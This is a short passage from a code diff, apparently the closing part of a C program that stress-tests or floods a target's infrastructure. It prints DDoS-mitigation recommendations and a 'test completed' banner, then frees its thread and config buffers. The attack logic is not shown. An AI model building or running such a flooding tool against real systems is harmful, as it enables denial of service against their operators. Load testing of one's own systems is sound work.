+    printf("════════════════════════════\n");
+    printf("1. Implement robust DDoS protection\n");
+    printf("2. Configure proper rate limiting\n");
+    printf("3. Use CDN with advanced filtering\n");
+    printf("4. Implement connection throttling\n");
+    printf("5. Deploy WAF with geo-blocking\n");
+    printf("6. Monitor resource usage continuously\n");
+    printf("7. Implement failover mechanisms\n");
+    printf("8. Configure auto-scaling policies\n");
+    
+    printf("\n╔══════════════════════════════════════════════════════════════╗\n");
+    printf("║  TEST COMPLETED - ANALYZE TARGET INFRASTRUCTURE RESPONSE    ║\n");
+    printf("╚══════════════════════════════════════════════════════════════╝\n");
+    
+    free(threads);
+    free(configs);
+    
+    return 0;
+}
